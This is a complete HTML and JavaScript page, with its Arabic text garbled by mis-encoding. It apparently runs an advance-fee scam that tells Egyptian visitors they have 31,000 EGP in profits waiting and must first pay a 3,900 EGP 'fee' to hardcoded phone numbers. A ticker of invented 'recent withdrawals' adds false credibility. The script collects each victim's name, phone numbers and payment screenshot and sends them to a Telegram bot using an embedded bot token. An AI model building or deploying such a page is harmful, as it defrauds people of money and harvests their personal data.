<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­</title>
    <style>
        body { font-family: Arial, sans-serif; direction: rtl; text-align: center; background: #f4f4f4; padding-top: 20px; }
        button { padding: 10px 25px; font-size: 18px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; margin: 5px; }
        .form-box { display: none; margin-top: 20px; background: white; padding: 20px; width: 320px; margin-left: auto; margin-right: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .alert { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-weight: bold; font-size: 14px; }
        input { width: 95%; padding: 8px; margin: 8px 0; font-size: 16px; }
        label { display: block; margin-top: 10px; font-weight: bold; text-align: right; }
        
        .copy-btn {
            background-color: #007bff;
            font-size: 14px;
            padding: 5px 10px;
            margin-top: 5px;
            display: inline-block;
            transition: background-color 0.3s;
        }
        .copy-btn.copied {
            background-color: #28a745;
        }
        
        .support-btn {
            background-color: #17a2b8;
            text-decoration: none;
            display: inline-block;
            color: white;
            padding: 10px 25px;
            font-size: 18px;
            border-radius: 5px;
            margin-top: 10px;
        }
        
        .warning-text {
            color: red;
            font-size: 13px;
            margin-top: 15px;
            font-weight: bold;
            line-height: 1.5;
        }

        /* ØªÙ†Ø³ÙŠÙ‚ Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø®Ø·Ø£ */
        .error-message {
            color: red;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
            display: none;
        }
        
        #step2 { display: none; }

        /* ØªÙ†Ø³ÙŠÙ‚ Ù‚Ø³Ù… Ø¢Ø®Ø± Ø§Ù„Ø³Ø­ÙˆØ¨Ø§Øª */
        .recent-withdrawals {
            background: #1a2332;
            color: white;
            width: 350px;
            margin: 20px auto;
            padding: 15px;
            border-radius: 8px;
            text-align: right;
            font-family: monospace;
            font-size: 16px;
        }
        .withdrawal-item {
            border-bottom: 1px solid #333;
            padding: 10px 0;
            transition: opacity 0.5s; /* ØªØ£Ø«ÙŠØ± Ø§Ù†ØªÙ‚Ø§Ù„ Ù†Ø§Ø¹Ù… */
        }
        .withdrawal-item:last-child {
            border-bottom: none;
        }
    </style>
</head>
<body>

    <h2>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£Ø±Ø¨Ø§Ø­</h2>
    <button onclick="showStep1()">Ø³Ø­Ø¨ Ø£Ø±Ø¨Ø§Ø­Ùƒ</button>
    <br>
    <a href="http://t.me/Trading_Shaima" class="support-btn" target="_blank">ğŸ“² Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø¯Ø¹Ù… Ø¨Ø¹Ø¯ Ø¯ÙØ¹ Ø§Ù„Ø±Ø³ÙˆÙ…</a>

    <div class="recent-withdrawals" id="recentWithdrawals">
        <div class="withdrawal-item" id="item0">ØªÙ… Ø³Ø­Ø¨ 010****1234 Ù„Ù€ EGP 31,000</div>
        <div class="withdrawal-item" id="item1">ØªÙ… Ø³Ø­Ø¨ 012****5678 Ù„Ù€ EGP 31,000</div>
        <div class="withdrawal-item" id="item2">ØªÙ… Ø³Ø­Ø¨ 011****9012 Ù„Ù€ EGP 31,000</div>
    </div>

    <div class="form-box" id="step1">
        <label for="name">Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø«Ù„Ø§Ø«ÙŠ:</label>
        <input type="text" id="name" placeholder="Ø§Ø¯Ø®Ù„ Ø§Ø³Ù…Ùƒ Ø«Ù„Ø§Ø«ÙŠ" required>

        <label for="phone">Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ:</label>
        <input type="tel" id="phone" placeholder="Ø§Ø¯Ø®Ù„ Ø±Ù‚Ù…Ùƒ" maxlength="11" required>
        
        <div id="step1-error" class="error-message"></div>
        <br><br>
        <button onclick="showStep2()">Ø§Ù„ØªØ§Ù„ÙŠ</button>
    </div>

    <div class="form-box" id="step2">
        <div class="alert">
            Ø£Ø±Ø¨Ø§Ø­Ùƒ <strong>31,000</strong> Ø¬Ù†ÙŠÙ‡<br>
            ÙŠØ¬Ø¨ Ø¯ÙØ¹ Ø§Ù„Ø±Ø³ÙˆÙ… <strong>3,900</strong> Ø¬Ù†ÙŠÙ‡<br>
            Ù„Ø§Ø³ØªÙ„Ø§Ù… Ø£Ø±Ø¨Ø§Ø­Ùƒ<br>
            <span style="color: red;">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù„ÙŠ Ù‡ØªØ­ÙˆÙ„ Ø¹Ù„ÙŠÙ‡ Ø§Ù„Ø±Ø³ÙˆÙ… : <span id="phoneToCopy"></span></span>
            <br>
            <button class="copy-btn" id="copyBtn" onclick="copyPhone()">Ø§Ø¶ØºØ· Ù„Ù„Ù†Ø³Ø®</button>
        </div>

        <label for="phoneFrom">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø°ÙŠ Ø­ÙˆÙ„Øª Ù…Ù†Ù‡:</label>
        <input type="tel" id="phoneFrom" placeholder="Ø§Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù…" maxlength="11" required>

        <label for="phoneTo">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù„ÙŠ Ù‡ØªØ³ØªÙ„Ù… Ø¹Ù„ÙŠØ© Ø§Ø±Ø¨Ø§Ø­Ùƒ:</label>
        <input type="tel" id="phoneTo" placeholder="Ø§Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù…" maxlength="11" required>
        
        <label>Ø§Ø±ÙØ¹ Ø§Ø³ÙƒØ±ÙŠÙ† Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø¯ÙØ¹</label>
        <input type="file" id="screenshot" accept="image/*" required>
        
        <div id="step2-error" class="error-message"></div>
        <br><br>
        <button id="submitBtn" onclick="sendToTelegram()">Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨</button>
        
        <div class="warning-text">
            ØªÙ†Ø¨ÙŠØ©<br>
            ÙŠØ¬Ø¨ ÙƒØªØ§Ø¨Ø© Ø§Ø³Ù…Ùƒ Ø«Ù„Ø§Ø«ÙŠ ÙˆØ±Ù‚Ù…Ùƒ ØµØ­ÙŠØ­ ÙˆØ§Ø°Ø§ Ø­Ø§ÙˆÙ„Øª Ø§Ù„ØªÙ„Ø§Ø¹Ø¨ Ø§Ùˆ ØªÙÙŠÙŠÙƒ Ø³ÙƒØ±ÙŠÙ† ØªØ­ÙˆÙŠÙ„ Ø§Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø³ÙƒØ±ÙŠÙ† ÙˆÙ‡Ù…ÙŠ Ø³ÙŠØªÙ… Ø­Ø¸Ø±Ùƒ Ù…Ù† Ø§Ù„Ù…Ù†ØµØ©
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8349631082:AAEkhEPtJoxG2xszGCTs05WNMl3VRzcOTZ4";
        const CHAT_ID = "5913937588"; 
        
        const randomNumbers = ["01281663199", "01221691641"];
        let selectedRandomPhone = "";

        // Ø¯Ø§Ù„Ø© Ù„ØªÙˆÙ„ÙŠØ¯ Ø£Ø±Ù‚Ø§Ù… Ø¹Ø´ÙˆØ§Ø¦ÙŠØ© Ù„Ø¥Ø®ÙØ§Ø¦Ù‡Ø§
        function generateMaskedPhone() {
            const prefix = ["010", "011", "012", "015"][Math.floor(Math.random() * 4)];
            const mid = "****";
            const suffix = Math.floor(1000 + Math.random() * 9000); // 4 Ø£Ø±Ù‚Ø§Ù… Ø£Ø®ÙŠØ±Ø©
            return `${prefix}${mid}${suffix}`;
        }

        // Ø¯Ø§Ù„Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø³Ø·Ø± ÙˆØ§Ø­Ø¯ ÙÙ‚Ø·
        function updateOneLine() {
            // Ø§Ø®ØªÙŠØ§Ø± Ø³Ø·Ø± Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ù…Ù† Ø§Ù„Ù€ 3 Ø£Ø³Ø·Ø± Ù„ØªØ­Ø¯ÙŠØ«Ù‡
            const randomLineIndex = Math.floor(Math.random() * 3);
            const lineToUpdate = document.getElementById(`item${randomLineIndex}`);
            
            // Ø¥Ø¶Ø§ÙØ© ØªØ£Ø«ÙŠØ± Ø§Ø®ØªÙØ§Ø¡ Ø¨Ø³ÙŠØ·
            lineToUpdate.style.opacity = "0";
            
            setTimeout(() => {
                // ØªØºÙŠÙŠØ± Ø§Ù„Ù†Øµ
                lineToUpdate.innerText = `ØªÙ… Ø³Ø­Ø¨ ${generateMaskedPhone()} Ù„Ù€ EGP 31,000`;
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¸Ù‡ÙˆØ±
                lineToUpdate.style.opacity = "1";
            }, 500); // Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ø°ÙŠ ÙŠØ³ØªØºØ±Ù‚Ù‡ Ø§Ù„ØªØ£Ø«ÙŠØ±
        }

        window.onload = function() {
            selectedRandomPhone = randomNumbers[Math.floor(Math.random() * randomNumbers.length)];
            document.getElementById("phoneToCopy").innerText = selectedRandomPhone;

            // ØªØ­Ø¯ÙŠØ« Ø³Ø·Ø± ÙˆØ§Ø­Ø¯ ÙƒÙ„ Ø«Ø§Ù†ÙŠØ©
            setInterval(updateOneLine, 1000);
        };

        function isInvalidPhone(phone) {
            return phone.length !== 11 || isNaN(phone);
        }

        function showStep1() {
            document.getElementById("step1").style.display = "block";
            document.querySelector("button[onclick='showStep1()']").style.display = "none";
            document.querySelector(".support-btn").style.display = "none";
            document.getElementById("recentWithdrawals").style.display = "none"; // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø³Ø­Ø¨
        }

        function showStep2() {
            const name = document.getElementById("name").value;
            const phone = document.getElementById("phone").value;
            const errorDiv = document.getElementById("step1-error");
            
            if (!name || !phone) {
                errorDiv.innerText = "ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø§Ù„Ø§Ø³Ù… ÙˆØ§Ù„Ø±Ù‚Ù…";
                errorDiv.style.display = "block";
                return;
            }

            if (isInvalidPhone(phone)) {
                errorDiv.innerText = "ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙØŒ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 11 Ø±Ù‚Ù…";
                errorDiv.style.display = "block";
                return;
            }
            
            errorDiv.style.display = "none";
            document.getElementById("step1").style.display = "none";
            document.getElementById("step2").style.display = "block";
        }

        function copyPhone() {
            const phoneText = document.getElementById("phoneToCopy").innerText;
            const copyBtn = document.getElementById("copyBtn");
            
            navigator.clipboard.writeText(phoneText).then(() => {
                copyBtn.innerText = "ØªÙ… Ø§Ù„Ù†Ø³Ø®!";
                copyBtn.classList.add("copied");
                
                setTimeout(() => {
                    copyBtn.innerText = "Ø§Ø¶ØºØ· Ù„Ù„Ù†Ø³Ø®";
                    copyBtn.classList.remove("copied");
                }, 2000);
            });
        }

        async function sendToTelegram() {
            const name = document.getElementById("name").value;
            const phoneMain = document.getElementById("phone").value;
            const phoneFrom = document.getElementById("phoneFrom").value;
            const phoneTo = document.getElementById("phoneTo").value;
            const fileInput = document.getElementById("screenshot");
            const submitBtn = document.getElementById("submitBtn");
            const errorDiv = document.getElementById("step2-error");

            if (!phoneFrom || !phoneTo || fileInput.files.length === 0) {
                errorDiv.innerText = "ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø©";
                errorDiv.style.display = "block";
                return;
            }

            if (isInvalidPhone(phoneFrom) || isInvalidPhone(phoneTo)) {
                errorDiv.innerText = "ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ø±Ù‚Ø§Ù… Ø§Ù„Ù‡Ø§ØªÙØŒ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 11 Ø±Ù‚Ù…";
                errorDiv.style.display = "block";
                return;
            }

            errorDiv.style.display = "none";
            const file = fileInput.files[0];
            const formData = new FormData();
            
            const message = `ğŸš¨ Ø·Ù„Ø¨ Ø³Ø­Ø¨ Ø¬Ø¯ÙŠØ¯:\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${name}\nğŸ“ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø³Ø¬Ù„: ${phoneMain}\nğŸ’³ Ø±Ù‚Ù… Ø§Ù„ØªØ­ÙˆÙŠÙ„: ${phoneFrom}\nğŸ’° Ø±Ù‚Ù… Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù…: ${phoneTo}\nğŸ’¸ ØªÙ… Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰: ${selectedRandomPhone}`;

            formData.append("chat_id", CHAT_ID);
            formData.append("photo", file);
            formData.append("caption", message);

            submitBtn.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...";
            submitBtn.disabled = true;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    document.getElementById("step2").innerHTML = "<div class='alert' style='background:#d4edda; color:#155724; padding:20px;'>ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ù†Ø¬Ø§Ø­! Ø³ÙŠØªÙ… Ù…Ø±Ø§Ø¬Ø¹ØªÙ‡ ÙÙˆØ±Ø§Ù‹.</div>";
                } else {
                    errorDiv.innerText = "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.";
                    errorDiv.style.display = "block";
                    submitBtn.innerText = "Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨";
                    submitBtn.disabled = false;
                }
            } catch (error) {
                errorDiv.innerText = "Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„.";
                errorDiv.style.display = "block";
                submitBtn.innerText = "Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨";
                submitBtn.disabled = false;
            }
        }
    </script>
</body>
</html>
